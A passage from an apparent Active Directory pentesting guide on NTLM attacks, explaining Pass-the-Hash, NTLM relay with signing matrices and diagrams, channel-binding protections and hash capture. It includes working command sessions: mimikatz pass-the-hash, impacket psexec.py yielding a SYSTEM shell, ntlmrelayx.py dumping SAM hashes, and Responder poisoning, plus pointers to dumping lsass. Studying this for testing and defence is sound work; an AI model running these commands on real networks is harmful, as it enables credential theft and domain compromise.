verify the credentials <a href="https://en.hackndo.com/ntlm-relay/#session-key">against the DC</a>.</p>
<p>
Also, bruteforcing attacks of domain accounts can be detected by <a href="https://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata">Windows-ATA</a>
since this solution examines all the traffic that goes to the DCs.</p>
</div>
</div>
<div id="outline-container-pass-the-hash" class="outline-5">
<h5 id="pass-the-hash">
Pass the hash
</h5>
<div id="outline-text-pass-the-hash" class="outline-text-5">
<p>
Another famous technique that uses the NTLM protocol is  <a href="https://en.hackndo.com/pass-the-hash/">Pass-The-Hash</a> (PtH). As
you may notice, the NTLM calculates the NTLM hash and session key based on the
NT hash of the client/user. Therefore, if an attacker knows the client NT
hash it can use this hash to impersonate the client in a NTLM authentication,
even if the plain password is unknown.</p>
<p>
This attack is pretty relevant nowadays since Microsoft included many
protections that prevent tools like <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> from retrieving clear-text
passwords <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf">from lsass</a> process. However, it is still possible to extract the NT
hashes for the user accounts, except in case of <a href="https://docs.microsoft.com/en-us/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified">credential guard</a> being enabled
(but also can <a href="https://teamhydra.blog/2020/08/25/bypassing-credential-guard/">be byppassed)</a>. </p>
<p>
To extract NT hashes from lsass you can use <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">mimikatz sekurlsa::logonpasswords</a>
command. Alternatively, you can <a href="https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html">dump the lsass process</a> with tools like
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>, <a href="https://lolbas-project.github.io/#/dump">sqldumper or others</a>, and copy the dump to your local machine to read
it with <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, <a href="https://github.com/skelsec/pypykatz">pypykatz</a> or <a href="https://en.hackndo.com/remote-lsass-dump-passwords/">read the dump remotely</a> with <a href="https://github.com/Hackndo/lsassy">lsassy</a>.</p>
<p>
Furthermore, NT hashes can also be extracted <a href="https://www.hackingarticles.in/credential-dumping-sam/">from the local SAM database</a> or
the <a href="https://www.hackingarticles.in/credential-dumping-ntds-dit/">NTDS.dit database in Domain Controllers</a>. </p>
<p>
In Windows machines you may need to <a href="https://www.praetorian.com/blog/inside-mimikatz-part1/">inject the NT hash in a process</a> with <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> in
order to use it to authenticate against remote machines with built-in tools or
IT tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>. Additionally, there are special tools like the <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a>
suite that allows to pass the NT hash as a parameter.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS C:\Users\Anakin\Downloads&gt; .\mimikatz.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
</span></span><span style="display:flex;"><span> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
</span></span><span style="display:flex;"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span><span style="display:flex;"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span><span style="display:flex;"><span> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
</span></span><span style="display:flex;"><span>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
</span></span><span style="display:flex;"><span>user    : Administrator
</span></span><span style="display:flex;"><span>domain  : contoso.local
</span></span><span style="display:flex;"><span>program : cmd.exe
</span></span><span style="display:flex;"><span>impers. : no
</span></span><span style="display:flex;"><span>NTLM    : b73fdfe10e87b4ca5c0d957f81de6863
</span></span><span style="display:flex;"><span>  |  PID  1080
</span></span><span style="display:flex;"><span>  |  TID  2664
</span></span><span style="display:flex;"><span>  |  LSA Process is now R/W
</span></span><span style="display:flex;"><span>  |  LUID 0 ; 2124820 (00000000:00206c14)
</span></span><span style="display:flex;"><span>  \_ msv1_0   - data copy @ 000001E6F01AE490 : OK !
</span></span><span style="display:flex;"><span>  \_ kerberos - data copy @ 000001E6EF86CCD8
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       -&gt; null
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ des_cbc_md4       OK
</span></span><span style="display:flex;"><span>   \_ *Password replace @ 000001E6F01D7E38 (32) -&gt; null</span></span></code></pre></div>
</div>
<figcaption>
Pass-The-Hash with mimikatz
</figcaption>
</figure>
<blockquote>
<p>Notice that when an NT hash (or Kerberos ticket) of other user is
injected, this will only allows you to impersonate the other user in remote
connections, not in the local computer.</p>
</blockquote>
<p>
On the other part, to perform a Pass-The-Hash from a Linux machine, you can use
the <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> suite, whose scripts accept the NT hash directly as a parameter.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Requesting shares on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
</span></span><span style="display:flex;"><span>[*] Uploading file WFKqIQpM.exe
</span></span><span style="display:flex;"><span>[*] Opening SVCManager on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Creating service AoRl on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Starting service AoRl.....
</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
</span></span><span style="display:flex;"><span>The system cannot find message text for message number 0x2350 in the message file for Application.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>b'Not enough memory resources are available to process this command.\r\n'
</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami
</span></span><span style="display:flex;"><span>nt authority\system</span></span></code></pre></div>
</div>
<figcaption>
Pass-The-Hash with psexec.py of impacket
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-ntlm-relay" class="outline-5">
<h5 id="ntlm-relay">
NTLM Relay
</h5>
<div id="outline-text-ntlm-relay" class="outline-text-5">
<p>
Let's talk now about one of the most famous attacks that involve NTLM, the
<a href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a> attack.</p>
<blockquote>
<p>To get more information about NTLM relay attacks, please check the <a href="https://en.hackndo.com/ntlm-relay/"><em>NTLM Relay</em></a>
post, that includes a great <a href="https://en.hackndo.com/ntlm-relay/#what-can-be-relayed">NTLM Relay matrix</a>.</p>
</blockquote>
<p>
The NTLM Relay attack consist of an attacker that performs a
Person-in-The-Middle and takes advantage of its intermediary position to
redirect the NTLM authentication to a server of its interest to get an
authenticated session.</p>
<figure>
<pre class="example">    client                 attacker               server
      |                       |                     |
      |                       |                -----|--.
      |     NEGOTIATE         |     NEGOTIATE       |  |
      | --------------------&gt; | ------------------&gt; |  |
      |                       |                     |  |
      |     CHALLENGE         |     CHALLENGE       |  |&gt; NTLM Relay
      | &lt;-------------------- | &lt;------------------ |  |
      |                       |                     |  | 
      |     AUTHENTICATE      |     AUTHENTICATE    |  |
      | --------------------&gt; | ------------------&gt; |  |
      |                       |                -----|--'
      |                       |    application      |
      |                       |     messages        |
      |                       | ------------------&gt; |
      |                       |                     |
      |                       | &lt;------------------ |
      |                       |                     |
      |                       | ------------------&gt; |
      |                       |                     |
</pre>
<figcaption>
NTLM relay attack
</figcaption>
</figure>
<p>
The flaw of the NTLM relay attack is that, even if the attacker is
authenticated, it <strong>doesn't know the session key</strong>, which is encrypted in the
transmission, and it is needed to sign and/or encrypt (seal) messages.
Therefore, if signing is negotiated between client and server, the attacker
won't be able to generate valid signatures for the application messages, thus
becoming unable to talk with the server, so the attack fails.</p>
<p>
However, even if the client and server wants to negotiate signing, the attacker
could tamper the messages in order to unset this flags. In order to avoid this,
as we have seen, the AUTHENTICATE message includes a <a href="#domain-controllers">MIC</a>, that is a signature
that takes into account all the NTLM messages. Finally if server checks the MIC
and doesn't correspond with the signature of the original messages, it aborts the
connection. </p>
<p>
Notwithstanding, since it is an optional field, an attacker could also remove
the MIC and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e">change the flags (in the AvPairs)</a> to specify that MIC is not present
(it cannot modify the MIC since is calculated with the session key).</p>
<p>
Hence, to protect the MIC, NTLMv2 uses the value of the AvPairs (including the
MIC flag) included in the AUTHENTICATE message to calculate the challenge
response. If the attacker modify the flag that indicates the MIC presence in the
AvPairs, then the challenge response checking will fail in the target server and
the session will be finished. It should be noted that <strong>NTLMv1 doesn't protect
the MIC</strong>, so it is vulnerable to message tampering.</p>
<blockquote>
<p>As a curiosity, before the <a href="https://www.coresecurity.com/core-labs/advisories/windows-pass-through-authentication-methods-improper-validation">CVE-2015-005</a>, in case of use <a href="#ntlm-in-active-directory">NTLM with domain
accounts</a>, an attacker could use the Netlogon call (NetrLogonSamLogonWithFlags) to
ask the DC to verify the AUTHENTICATE message and return the session key, so an
attacker could use this to bypass the signing restriction.</p>
</blockquote>
<p>
Notwithstanding, this is not the end of the history. NTLM allows to negotiate
signing by using the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832">NTLM flag</a> <em>NTLMSSP_NEGOTIATE_SIGN</em>. That can be set by
client and server. However, that both <strong>set this flag doesn't guarantee that
signing is going to be used</strong>. It depends on the application protocol. Also, it
is common that there are 3 signing states: Not Supported, Supported, Required.</p>
<p>
For example, in the case of <a href="#smb-shares">SMB</a>, it includes its own sign flags (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e14db7ff-763a-4263-8b10-0c3944f52fc5">SecurityMode</a>)
that determines if the signing is supported/required or not. Therefore, in SMB
communications the NTLM flag <em>NTLMSSP_NEGOTIATE_SIGN</em> is set to indicate that
signing is supported, but it is necessary to check the SMB flags in order to
determine if communication is going to be signed. Moreover, this behaviour is
different based on the SMB version. Here I will let you a copy of the
<a href="https://en.hackndo.com/ntlm-relay/#signature-matrix">SMB signing matrixes</a>.</p>
<p>
In case of SMB1 there are 3 signing states: Disabled, Enabled and Required.
Required.</p>
<figure>
<table>
<thead>
<tr>
<th>client\server</th>
<th>Required</th>
<th>Enabled</th>
<th>Disabled</th>
</tr>
</thead>
<tbody>
<tr>
<td>Required</td>
<td>Signed</td>
<td>Signed</td>
<td>Signed</td>
</tr>
<tr>
<td>Enabled</td>
<td>Signed (Default DCs)</td>
<td>Signed</td>
<td>Not Signed (Default)</td>
</tr>
<tr>
<td>Disabled</td>
<td>Signed</td>
<td>Not Signed</td>
<td>Not Signed</td>
</tr>
</tbody>
</table>
<figcaption>
SMB1 signing matrix
</figcaption>
</figure>
<p>
However, in case of SMB2 signing is always enabled but there are 2 states:
Required and Not Required.</p>
<figure>
<table>
<thead>
<tr>
<th>client\server</th>
<th>Required</th>
<th>Not Required</th>
</tr>
</thead>
<tbody>
<tr>
<td>Required</td>
<td>Signed</td>
<td>Signed</td>
</tr>
<tr>
<td>Not Required</td>
<td>Signed (Default DCs)</td>
<td>Not Signed (Default)</td>
</tr>
</tbody>
</table>
<figcaption>
SMB2 signing matrix
</figcaption>
</figure>
<p>
As you can see, both in <strong>SMB1 and SMB2, by default the client has the signing
Enabled (but not required)</strong>, so the NTLM flag <em>NTLMSSP_NEGOTIATE_SIGN</em> is
set. However the servers only have the <em>NTLMSSP_NEGOTIATE_SIGN</em> flag set in
SMB2, with the exception of <strong>DCs that always require SMB signing</strong>. This must be
taken into account when performing cross-protocol NTLM relay attack. </p>
<p>
Another common protocol that uses NTLM is <a href="#ldap">LDAP</a>, that also has three levels of
signing: Required, Enabled and Disabled. However, unlike SMB, LDAP protocol
doesn't have signing flags, so the negotiation is based on the
<em>NTLMSSP_NEGOTIATE_SIGN</em> flag of NTLM, that it is set when LDAP is at least
supported/enabled. The following matrix identifies the cases: </p>
<figure>
<table>
<thead>
<tr>
<th>client\server</th>
<th>Required</th>
<th>Enabled</th>
<th>Disabled</th>
</tr>
</thead>
<tbody>
<tr>
<td>Required</td>
<td>Signed</td>
<td>Signed</td>
<td>Not Supported</td>
</tr>
<tr>
<td>Enabled</td>
<td>Signed</td>
<td>Signed (Default)</td>
<td>Not Signed</td>
</tr>
<tr>
<td>Disabled</td>
<td>Not Supported</td>
<td>Not Signed</td>
<td>Not Signed</td>
</tr>
</tbody>
</table>
<figcaption>
LDAP signing matrix
</figcaption>
</figure>
<blockquote>
<p>It is possible to <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server">modify the LDAP signing configuration</a> for both client and
server by applying GPOs.</p>
</blockquote>
<p>
As you can see, when both the client and the server have the signing enabled
(that means that is supported), the communication is signed. Besides, it must be
taken into account that <strong>DCs do not enforce LDAP signing by default</strong>, so a
client can establish an unsigned session with a DC.</p>
<p>
This should be enough information to deduce that a cross-protocol relay attack
can be performed from LDAP to SMB2 (in the default case), but not SMB2 to
LDAP.</p>
<figure>
<pre class="example">    client &lt;-----SMB2----&gt; attacker &lt;----LDAP---&gt; server
      |                       |                     |
      |                       |                -----|--.
      |   NEGOTIATE SIGN=1    |  NEGOTIATE SIGN=1   |  |
      | --------------------&gt; | ------------------&gt; |  |
      |                       |                     |  |
      |   CHALLENGE SIGN=1    |  CHALLENGE SIGN=1   |  |&gt; NTLM Relay
      | &lt;-------------------- | &lt;------------------ |  |
      |                       |                     |  | 
      |  AUTHENTICATE SIGN=1  | AUTHENTICATE SIGN=1 |  |
      | --------------------&gt; | ------------------&gt; | -|---&gt; MIC OK!! 
      |                       |                -----|--'
      |                       |         ||          |
      |                       |         vv          |
      |                       |    client SIGN = 1  |
      |                       |    server SIGN = 1  |
      |                       |         ||          |
      |                       |         vv          |
      |                       |   Signing required  |
      |                       |    Attack failed    |
      |                       |                     |
</pre>
<figcaption>
Cross-protocol NTLM Relay from SMB2 to LDAP (default case).
</figcaption>
</figure>
<p>
As we seen earlier, SMB2 always set the <em>NTLMSSP_NEGOTIATE_SIGN</em>, therefore, if
we relay this NTLM messages to a LDAP server that supports signing, then signing
is negotiated and the attack fails. Remember that NTLM messages cannot be
tampered since MIC is protecting then (in NTLMv2).</p>
<p>
In the contrary case and attacker can negotiate with the SMB2 server that
signing is not required by using the SMB headers and relay the LDAP NTLM
messages, that by default sets the <em>NTLMSSP_NEGOTIATE_SIGN</em> flag. Once the NTLM
negotiation is finished, since signing is not used in SMB if it is not required,
the session will not require signing, so the attack success. However, this
attack is not possible against DCs since by default they require signing.</p>
<figure>
<pre class="example">    client &lt;-----LDAP----&gt; attacker &lt;------SMB2------&gt; server (Non DC)
      |                       |
      |     LDAP request      |                          |
      | --------------------&gt; |                          |
      |                       |                          |
      |     LDAP response     |                          |
      | &lt;-------------------- |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE REQUEST  |
      |                       | -----------------------&gt; |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE RESPONSE |
      |                       | &lt;----------------------- |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                     -----|--.
      |   NEGOTIATE SIGN=1    |     NEGOTIATE SIGN=1     |  |
      | --------------------&gt; | -----------------------&gt; |  |
      |                       |                          |  |
      |                       |                          |  |
      |   CHALLENGE SIGN=1    |     CHALLENGE SIGN=1     |  |&gt; NTLM Relay
      | &lt;-------------------- | &lt;----------------------- |  |
      |                       |                          |  |
      |                       |                          |  | 
      |  AUTHENTICATE SIGN=1  |   AUTHENTICATE SIGN=1    |  |
      | --------------------&gt; | -----------------------&gt; | -|---&gt; MIC OK!!
      |                       |                     -----|--'
      |                       |         ||               |
      |                       |         vv               |
      |                       | client SIGN_REQUIRED = 0 |
      |                       | server SIGN_REQUIRED = 0 |
      |                       |         ||               |
      |                       |         vv               |
      |                       |  Signing NOT required    |
      |                       |   Successful Attack!!    |
      |                       |                          |
      |                       |    application           |
      |                       |     messages             |
      |                       | -----------------------&gt; |
      |                       |                          |
      |                       | &lt;----------------------- |
      |                       |                          |
      |                       | -----------------------&gt; |
      |                       |                          |
</pre>
<figcaption>
Cross-protocol NTLM Relay from SMB2 to LDAP (default case).
</figcaption>
</figure>
<p>
Actually, the SMB2 protocol can be relayed against itself:</p>
<figure>
<pre class="example"> client &lt;------SMB2-----&gt; attacker &lt;------SMB2------&gt; server (Non DC)
   |                          |                          |
   | SMB2 NEGOTIATE REQUEST   |  SMB2 NEGOTIATE REQUEST  |
   | -----------------------&gt; | -----------------------&gt; |
   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   | SMB2 NEGOTIATE RESPONSE  |  SMB2 NEGOTIATE RESPONSE |
   | &lt;----------------------- | &lt;----------------------- |
   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   |                          |                     -----|--.
   |   NEGOTIATE SIGN=1       |     NEGOTIATE SIGN=1     |  |
   | --------------------&gt;    | -----------------------&gt; |  |
   |                          |                          |  |
   |                          |                          |  |
   |   CHALLENGE SIGN=1       |     CHALLENGE SIGN=1     |  |&gt; NTLM Relay
   | &lt;--------------------    | &lt;----------------------- |  |
   |                          |                          |  |
   |                          |                          |  | 
   |  AUTHENTICATE SIGN=1     |   AUTHENTICATE SIGN=1    |  |
   | --------------------&gt;    | -----------------------&gt; | -|---&gt; MIC OK!!
   |                          |                     -----|--'
   |                          |           ||             |
   |                          |           vv             |
   |                          | client SIGN_REQUIRED = 0 |
   |                          | server SIGN_REQUIRED = 0 |
   |                          |           ||             |
   |                          |           vv             |
   |                          |  Signing NOT required    |
   |                          |   Successful Attack!!    |
   |                          |                          |
   |                          |       application        |
   |                          |        messages          |
   |                          | -----------------------&gt; |
   |                          |                          |
   |                          | &lt;----------------------- |
   |                          |                          |
   |                          | -----------------------&gt; |
   |                          |                          |
</pre>
<figcaption>
SMB2 NTLM Relay (default case).
</figcaption>
</figure>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ntlmrelayx.py -t 192.168.100.10 -smb2support --no-http-server
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Protocol Client HTTP loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client HTTPS loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client SMB loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client LDAP loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client LDAPS loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client SMTP loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client IMAP loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client IMAPS loaded..
</span></span><span style="display:flex;"><span>[*] Protocol Client MSSQL loaded..
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.3) or chardet (3.0.4) doesn't match a supported version!
</span></span><span style="display:flex;"><span>  RequestsDependencyWarning)
</span></span><span style="display:flex;"><span>[*] Running in relay mode to single host
</span></span><span style="display:flex;"><span>[*] Setting up SMB Server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Servers started, waiting for connections
</span></span><span style="display:flex;"><span>[*] SMBD-Thread-2: Connection from CONTOSO/ANAKIN@192.168.100.7 controlled, attacking target smb://192.168.100.10
</span></span><span style="display:flex;"><span>[*] Authenticating against smb://192.168.100.10 as CONTOSO/ANAKIN SUCCEED
</span></span><span style="display:flex;"><span>[*] Service RemoteRegistry is in stopped state
</span></span><span style="display:flex;"><span>[*] Starting service RemoteRegistry
</span></span><span style="display:flex;"><span>[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
</span></span><span style="display:flex;"><span>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
</span></span><span style="display:flex;"><span>user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
</span></span><span style="display:flex;"><span>srvuser:1005:aad3b435b51404eeaad3b435b51404ee:38db3f2d2842051c8b7c01d56da283dd:::
</span></span><span style="display:flex;"><span>[*] Done dumping SAM hashes for host: 192.168.100.10
</span></span><span style="display:flex;"><span>[*] Stopping service RemoteRegistry</span></span></code></pre></div>
</div>
<figcaption>
NTLM Relay SMB2 to SMB2 with ntlmrelayx.py
</figcaption>
</figure>
<p>
Another protocol that can use NTLM is <a href="#http">HTTP</a>, but by default signing it is not
used. So HTTP can be used for an cross-protocol relay attack for LDAP or SMB.</p>
<figure>
<pre class="example">    client &lt;-----HTTP----&gt; attacker &lt;----LDAP----&gt; server
      |                       |                      |
      |                       |                 -----|--.
      |     NEGOTIATE SIGN=0  |  NEGOTIATE SIGN=0    |  |
      | --------------------&gt; | -------------------&gt; |  |
      |                       |                      |  |
      |     CHALLENGE SIGN=1  |  CHALLENGE SIGN=1    |  |&gt; NTLM Relay
      | &lt;-------------------- | &lt;------------------- |  |
      |                       |                      |  | 
      |  AUTHENTICATE SIGN=0  | AUTHENTICATE SIGN=0  |  |
      | --------------------&gt; | -------------------&gt; | -|---&gt; MIC OK!! 
      |                       |                 -----|--'
      |                       |         ||           |
      |                       |         vv           |
      |                       |    client SIGN = 0   |
      |                       |    server SIGN = 1   |
      |                       |         ||           |
      |                       |         vv           |
      |                       | Signing NOT required |
      |                       |  Successful Attack!! |
      |                       |                      |
      |                       |    application       |
      |                       |     messages         |
      |                       | -------------------&gt; |
      |                       |                      |
      |                       | &lt;------------------- |
      |                       |                      |
      |                       | -------------------&gt; |
      |                       |                      |
</pre>
<figcaption>
Cross-protocol NTLM Relay from HTTP to LDAP.
</figcaption>
</figure>
<p>
As you can see, since the client doesn't specify that signing is enabled, LDAP
signing is not required. This scenario was used to exploit the <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a>
vulnerability. Relaying to LDAP is very useful since you could use to alter the
ACLs or objects of the domain <a href="#database">database</a>, allowing you to escalate
<a href="#acl-attacks">privileges in some cases</a>.</p>
<p>
To perform NTLM relay attacks we can use the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> or
<a href="https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py">MultiRelay.py</a> scripts, in conjuction with <a href="https://github.com/lgandx/Responder">Responder.py</a> that allows to perform
Person-in-The-Middle attacks. In Windows, other option is to use <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to
perform both MiTM and relay. The limitation of this tools is that doesn't allow
to perform NTLM relay attack from SMB2 to SMB2 from a Windows machine, since the
port 445 is used by the system.</p>
<p>
Apart from SMB and LDAP, there are other protocols like MS-SQL or SMTP that
support NTLM and could be use for this attack.</p>
<div id="outline-container-ntlm-relay-protections" class="outline-6">
<h6 id="ntlm-relay-protections">
NTLM Relay Protections
</h6>
<div id="outline-text-ntlm-relay-protections" class="outline-text-6">
<p>
However, there are protections for cross-protocol NTLM Relay, <strong>Channel
Binding</strong> or <strong>EPA</strong> (Enhanced Protection for Authentication). The idea behind
Channel Binding is to add information about the application protocol to the
AUTHENTICATE message of NTLM, that is protected by the MIC. Two types of
bindings are introduced: <strong>Service binding</strong> and <strong>TLS binding</strong>.</p>
<p>
<a href="https://en.hackndo.com/ntlm-relay/#service-binding">Service binding</a> consists of the client indicating the <a href="#services">service SPN</a> in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e">AvPairs</a> of
the AUTHENTICATE message (that are protected by the NTLMv2 hash), so the server
can check if the NTLM request was meant for it. For example, if a client
indicates that the NTLM request is for an LDAP service, and the server that
receives it handles SMB (since there is an attacker in the middle), it will
reject the authentication. Moreover, the SPN also indicates the address of the
server, so if it is relayed to a different server, the authentication will be
rejected.</p>
<p>
On the other hand, in <a href="https://en.hackndo.com/ntlm-relay/#tls-binding">TLS binding</a> the client calculates a hash, known as CBT
(Channel Binding Token), with the session key of the server certificate, that it
is used to create a TLS channel. If there an attacker performing a MiTM attack,
then the certificate provided by the attacker (it needs to create a new
certificate to decrypt/encrypt TLS traffic) will be different from that of the
original server. Thus, the server will check the CBT generated by the client and
if it doesn't match with the hash of its own certificate, it will reject the
authentication.</p>
<p>
Same as for the signing, the application of the Channel Binding depends on the
application protocol. The updated clients of <a href="https://support.microsoft.com/en-us/help/2345886/description-of-the-update-that-implements-extended-protection-for-auth#section-3">SMB</a> and <a href="https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry">LDAP</a> should use Channel
binding, however the servers don't seem to check it.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-ntlm-hashes-cracking" class="outline-5">
<h5 id="ntlm-hashes-cracking">
NTLM hashes cracking
</h5>
<div id="outline-text-ntlm-hashes-cracking" class="outline-text-5">
<p>
Notwithstanding, even in the case of being unable to performing relay attacks,
it is stil possible to <a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">grab the NTLM hashes</a> by performing a Person-in-The-Middle
attack and then crack them. You can use tools like <a href="https://github.com/lgandx/Responder">Responder.py</a> or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to
perform a PiTM attack.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># ./Responder.py -I enp7s0
</span></span><span style="display:flex;"><span>                                         __
</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
</span></span><span style="display:flex;"><span>                   |__|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Poisoners:
</span></span><span style="display:flex;"><span>    LLMNR                      [ON]
</span></span><span style="display:flex;"><span>    NBT-NS                     [ON]
</span></span><span style="display:flex;"><span>    DNS/MDNS                   [ON]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Servers:
</span></span><span style="display:flex;"><span>    HTTP server                [ON]
</span></span><span style="display:flex;"><span>    HTTPS server               [ON]
</span></span><span style="display:flex;"><span>    WPAD proxy                 [OFF]
</span></span><span style="display:flex;"><span>    Auth proxy                 [OFF]
</span></span><span style="display:flex;"><span>    SMB server                 [ON]
</span></span><span style="display:flex;"><span>    Kerberos server            [ON]
</span></span><span style="display:flex;"><span>    SQL server                 [OFF]
</span></span><span style="display:flex;"><span>    FTP server                 [ON]
</span></span><span style="display:flex;"><span>    IMAP server                [ON]
</span></span><span style="display:flex;"><span>    POP3 server                [ON]
</span></span><span style="display:flex;"><span>    SMTP server                [ON]
</span></span><span style="display:flex;"><span>    DNS server                 [ON]
</span></span><span style="display:flex;"><span>    LDAP server                [OFF]
</span></span><span style="display:flex;"><span>    RDP server                 [ON]
</span></span><span style="display:flex;"><span>
